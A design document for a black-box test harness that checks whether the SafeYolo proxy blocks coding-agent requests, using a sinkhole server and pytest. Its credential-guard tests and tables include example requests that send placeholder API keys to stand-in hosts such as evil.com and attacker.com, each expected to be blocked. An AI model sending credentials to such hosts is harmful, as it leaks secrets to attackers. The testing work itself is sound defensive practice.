# SafeYolo Black Box Test Harness

## Overview

A test harness that treats SafeYolo as a black box, simulating a coding agent making requests through the proxy to various destinations. This validates SafeYolo's security guarantees without relying on internal implementation details.

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        Docker Test Network                              │
│                                                                         │
│  ┌──────────────┐      ┌─────────────────┐      ┌──────────────────┐   │
│  │ Test Runner  │      │    SafeYolo     │      │    Sinkhole      │   │
│  │              │      │   (black box)   │      │                  │   │
│  │ pytest +     │ ───> │                 │ ───> │ Multi-host HTTP  │   │
│  │ httpx        │      │ Proxy: 8080     │      │ server with      │   │
│  │              │      │ Admin: 9090     │      │ request capture  │   │
│  │              │      │                 │      │                  │   │
│  │ Control API ─┼──────┼─────────────────┼──────┼─> Query API      │   │
│  └──────────────┘      └─────────────────┘      └──────────────────┘   │
│         │                                               │              │
│         │              DNS Resolution                   │              │
│         │         ┌─────────────────────┐               │              │
│         │         │ api.openai.com ─────┼───────────────┘              │
│         │         │ api.anthropic.com ──┼───────────────┘              │
│         │         │ evil.com ───────────┼───────────────┘              │
│         │         │ attacker.com ───────┼───────────────┘              │
│         │         │ (all resolve to sinkhole)                          │
│         │         └─────────────────────┘                              │
└─────────────────────────────────────────────────────────────────────────┘
```

## Components

### 1. Sinkhole Server

A single HTTP/HTTPS server that:
- Accepts connections for ANY hostname (via Host header / SNI)
- Routes requests based on hostname to behavior handlers
- Records all received requests for later inspection
- Provides a control API for test assertions

**Behavior Handlers:**
```python
HANDLERS = {
    "api.openai.com": OpenAIHandler(),      # Returns mock OpenAI responses
    "api.anthropic.com": AnthropicHandler(), # Returns mock Anthropic responses
    "httpbin.org": HttpBinHandler(),         # Echo service
    "evil.com": GenericHandler(),            # Generic 200 OK
    "attacker.com": GenericHandler(),        # Generic 200 OK
    "*": DefaultHandler(),                   # Catch-all
}
```

**Request Recording:**
```python
@dataclass
class CapturedRequest:
    timestamp: float
    host: str                    # From Host header
    method: str
    path: str
    headers: dict[str, str]      # All headers received
    body: bytes
    client_ip: str

# Stored in memory, queryable via control API
captured_requests: list[CapturedRequest] = []
```

**Control API (port 9999):**
```
GET  /requests                    # List all captured requests
GET  /requests?host=api.openai.com  # Filter by host
GET  /requests?since=<timestamp>  # Requests after timestamp
POST /requests/clear              # Clear captured requests
GET  /health                      # Health check
```

### 2. DNS Resolution

Using Docker network aliases, the sinkhole container responds to multiple hostnames:

```yaml
services:
  sinkhole:
    networks:
      testnet:
        aliases:
          - api.openai.com
          - api.anthropic.com
          - evil.com
          - attacker.com
          - httpbin.org
          - legitimate-api.com
```

Alternative: Use `extra_hosts` in SafeYolo container:
```yaml
services:
  safeyolo:
    extra_hosts:
      - "api.openai.com:${SINKHOLE_IP}"
      - "evil.com:${SINKHOLE_IP}"
```

### 3. Test Runner

Pytest-based test suite that:
- Sends HTTP requests through the SafeYolo proxy
- Queries the sinkhole to verify what was received (or not received)
- Asserts on proxy responses (blocked, allowed, modified)

**Test Flow:**
```python
def test_credential_exfiltration_blocked():
    """OpenAI API key to evil.com should be blocked."""
    # 1. Clear sinkhole request log
    sinkhole.clear_requests()

    # 2. Send request through proxy
    response = client.post(
        "https://evil.com/log",
        headers={"Authorization": "Bearer sk-proj-xxx"},
        proxy=SAFEYOLO_PROXY
    )

    # 3. Assert proxy blocked it
    assert response.status_code == 428
    assert "approval" in response.json().get("error", "").lower()

    # 4. Assert sinkhole did NOT receive the request
    requests = sinkhole.get_requests(host="evil.com")
    assert len(requests) == 0, "Request should not reach evil.com"

def test_legitimate_request_forwarded():
    """OpenAI API key to api.openai.com should pass through."""
    sinkhole.clear_requests()

    response = client.post(
        "https://api.openai.com/v1/chat/completions",
        headers={"Authorization": "Bearer sk-proj-xxx"},
        json={"model": "gpt-4", "messages": []},
        proxy=SAFEYOLO_PROXY
    )

    # Proxy should forward
    assert response.status_code == 200

    # Sinkhole should receive with credentials intact
    requests = sinkhole.get_requests(host="api.openai.com")
    assert len(requests) == 1
    assert "Authorization" in requests[0].headers
    assert requests[0].headers["Authorization"].startswith("Bearer sk-")
```

## Test Scenarios

### Credential Guard Tests

| Scenario | Request | Expected Proxy Response | Expected at Sinkhole |
|----------|---------|------------------------|---------------------|
| OpenAI key to OpenAI | `Authorization: Bearer sk-proj-xxx` to `api.openai.com` | 200 (forward) | Request with credentials |
| OpenAI key to wrong host | `Authorization: Bearer sk-proj-xxx` to `evil.com` | 428 (blocked) | Nothing |
| Anthropic key to Anthropic | `x-api-key: sk-ant-xxx` to `api.anthropic.com` | 200 (forward) | Request with credentials |
| Anthropic key to wrong host | `x-api-key: sk-ant-xxx` to `attacker.com` | 428 (blocked) | Nothing |
| No credentials | Request to `httpbin.org` | 200 (forward) | Request received |

### Network Guard Tests

| Scenario | Request | Expected Proxy Response | Expected at Sinkhole |
|----------|---------|------------------------|---------------------|
| Allowed domain | Request to `api.openai.com` | 200 (forward) | Request received |
| Denied domain | Request to `blocked.example.com` | 403 (denied) | Nothing |
| Budget exhausted | N+1 requests to budgeted domain | 429 (rate limited) | N requests |

### Circuit Breaker Tests

| Scenario | Setup | Expected Proxy Response |
|----------|-------|------------------------|
| Healthy upstream | Sinkhole returns 200 | 200 (forward) |
| Failing upstream | Sinkhole returns 500 x N | 503 (circuit open) |
| Recovery | After timeout, sinkhole returns 200 | 200 (circuit closed) |

### Header Modification Tests

| Scenario | Request Headers | Expected at Sinkhole |
|----------|----------------|---------------------|
| Request ID added | (none) | `X-Request-Id: req-xxx` present |
| Sensitive headers stripped | `Cookie: session=xxx` | No `Cookie` header |

## File Structure

```
tests/
├── blackbox/
│   ├── docker-compose.yml       # Test orchestration
│   ├── sinkhole/
│   │   ├── Dockerfile
│   │   ├── server.py            # Multi-host HTTP server
│   │   ├── handlers.py          # Per-host response handlers
│   │   └── requirements.txt
│   ├── runner/
│   │   ├── Dockerfile
│   │   ├── conftest.py          # Pytest fixtures
│   │   ├── sinkhole_client.py   # Client for sinkhole control API
│   │   ├── test_credential_guard.py
│   │   ├── test_network_guard.py
│   │   ├── test_circuit_breaker.py
│   │   ├── test_header_modification.py
│   │   └── requirements.txt
│   └── run_tests.sh             # Convenience script
```

## Docker Compose

```yaml
version: "3.8"

services:
  safeyolo:
    image: safeyolo:latest
    networks:
      - testnet
    ports:
      - "8080:8080"   # Proxy
      - "9090:9090"   # Admin API
    volumes:
      - ./config:/app/config:ro
    environment:
      - ADMIN_API_TOKEN=${ADMIN_API_TOKEN}

  sinkhole:
    build: ./sinkhole
    networks:
      testnet:
        aliases:
          - api.openai.com
          - api.anthropic.com
          - evil.com
          - attacker.com
          - httpbin.org
          - legitimate-api.com
    ports:
      - "9999:9999"   # Control API (for debugging)

  test-runner:
    build: ./runner
    networks:
      - testnet
    depends_on:
      - safeyolo
      - sinkhole
    environment:
      - PROXY_URL=http://safeyolo:8080
      - ADMIN_URL=http://safeyolo:9090
      - ADMIN_API_TOKEN=${ADMIN_API_TOKEN}
      - SINKHOLE_API=http://sinkhole:9999
    command: pytest -v --tb=short

networks:
  testnet:
    driver: bridge
```

## Running Tests

```bash
# Build and run all tests
cd tests/blackbox
docker-compose up --build --abort-on-container-exit

# Run specific test file
docker-compose run test-runner pytest test_credential_guard.py -v

# Interactive debugging
docker-compose run test-runner bash
```

## Sinkhole Implementation Notes

### TLS Support

For HTTPS testing, sinkhole needs a wildcard certificate:

```python
# Generate self-signed wildcard cert
# CN=*.test, SAN=*.openai.com, *.anthropic.com, etc.

# Or use mkcert for local dev:
# mkcert -install
# mkcert "*.openai.com" "*.anthropic.com" "evil.com" localhost
```

SafeYolo would need to trust this CA or disable upstream verification for tests.

### Response Handlers

```python
class OpenAIHandler:
    """Simulates OpenAI API responses."""

    def handle(self, request: CapturedRequest) -> Response:
        if request.path == "/v1/chat/completions":
            return Response(
                status=200,
                json={
                    "id": "chatcmpl-test",
                    "object": "chat.completion",
                    "choices": [{"message": {"content": "Hello!"}}]
                }
            )
        elif request.path == "/v1/models":
            return Response(status=200, json={"data": []})
        else:
            return Response(status=404)

class GenericHandler:
    """Returns 200 OK for any request."""

    def handle(self, request: CapturedRequest) -> Response:
        return Response(
            status=200,
            json={"received": True, "host": request.host, "path": request.path}
        )
```

## Success Criteria

The black box test harness is complete when:

1. **Isolation**: Tests run in isolated Docker network with no external dependencies
2. **Determinism**: All test hostnames resolve to sinkhole, responses are predictable
3. **Observability**: Every request can be inspected at the sinkhole
4. **Coverage**: All security guarantees have corresponding black box tests
5. **CI Ready**: Can run in CI pipeline with single command

## Security Guarantees to Test

1. **Credential Protection**
   - API keys only sent to authorized hosts
   - Blocked requests don't leak credentials to sinkhole

2. **Access Control**
   - Denied domains never reach sinkhole
   - Budget limits enforced (count requests at sinkhole)

3. **Fail-Safe Behavior**
   - Default is block mode
   - Unknown credentials are blocked, not forwarded

4. **Audit Trail**
   - Block responses include event_id
   - Logs correlate with sinkhole observations

## Implementation Priority

1. **Phase 1**: Basic sinkhole + credential guard tests
2. **Phase 2**: Network guard + circuit breaker tests
3. **Phase 3**: TLS support + header modification tests
4. **Phase 4**: CI integration + performance tests
